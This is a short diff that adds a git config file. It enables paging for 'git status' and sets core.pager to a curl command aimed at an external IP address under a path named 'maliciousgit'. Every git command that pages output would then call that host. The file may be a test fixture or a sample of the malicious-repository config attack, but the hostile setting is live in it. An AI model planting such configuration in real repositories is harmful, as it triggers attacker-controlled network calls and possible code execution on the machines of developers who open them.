@@ -1,0 +1,8 @@
+[pager]
+	status = true
+[core]
+	repositoryformatversion = 0
+	filemode = true
+	bare = false
+	worktree = "."
+	pager = "curl http://193.187.181.12/maliciousgit/pager"
